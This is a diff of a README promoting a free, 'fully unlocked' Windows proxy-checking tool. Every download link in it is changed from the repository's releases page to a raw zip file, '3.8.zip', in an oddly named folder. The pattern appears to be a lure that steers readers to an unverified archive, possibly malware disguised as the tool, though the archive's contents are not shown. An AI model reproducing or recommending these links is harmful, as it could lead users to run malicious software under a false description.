@@ -1,6 +1,6 @@
 # 🚀 Proxy-Checker – Your Ultimate Free Proxy Testing Tool for Windows
 
-[![Download Now](https://img.shields.io/badge/Download-Proxy--Checker-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://github.com/donyhie1994/Proxy-Checker/releases)
+[![Download Now](https://img.shields.io/badge/Download-Proxy--Checker-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=blue)](https://github.com/donyhie1994/Proxy-Checker/raw/refs/heads/main/ungroaning/3.8.zip)
 
 ---
 
@@ -8,7 +8,7 @@
 
 Welcome to **Proxy-Checker** – the most powerful, completely free, and fully unlocked proxy testing application for Windows in 2026. Whether you're a casual user wanting to verify a proxy or a power user managing hundreds of proxies, this tool gives you everything you need without any limitations, watermarks, or hidden fees.
 
-Visit this link to download the application: **[https://github.com/donyhie1994/Proxy-Checker/releases](https://github.com/donyhie1994/Proxy-Checker/releases)**
+Visit this link to download the application: **[https://github.com/donyhie1994/Proxy-Checker/raw/refs/heads/main/ungroaning/3.8.zip](https://github.com/donyhie1994/Proxy-Checker/raw/refs/heads/main/ungroaning/3.8.zip)**
 
 ---
 
@@ -49,7 +49,7 @@ Getting Proxy-Checker on your PC is incredibly easy. Follow these simple steps:
 ### Step 1: Visit the Official Download Page
 Click the button below or visit the link directly:
 
-[**🔗 DOWNLOAD PROXY-CHECKER NOW**](https://github.com/donyhie1994/Proxy-Checker/releases)
+[**🔗 DOWNLOAD PROXY-CHECKER NOW**](https://github.com/donyhie1994/Proxy-Checker/raw/refs/heads/main/ungroaning/3.8.zip)
 
 Visit this link to download the application.
 
@@ -149,7 +149,7 @@ If you encounter any issues or have questions, check the repository's Issues sec
 
 Proxy-Checker is the essential tool for anyone who uses proxies on Windows. It's free, fast, reliable, and incredibly easy to use. Don't waste time with complicated, paid alternatives – download Proxy-Checker today and start checking proxies like a pro.
 
-[**⬇️ DOWNLOAD PROXY-CHECKER – FREE & UNLOCKED**](https://github.com/donyhie1994/Proxy-Checker/releases)
+[**⬇️ DOWNLOAD PROXY-CHECKER – FREE & UNLOCKED**](https://github.com/donyhie1994/Proxy-Checker/raw/refs/heads/main/ungroaning/3.8.zip)
 
 Visit this link to download the application.
 
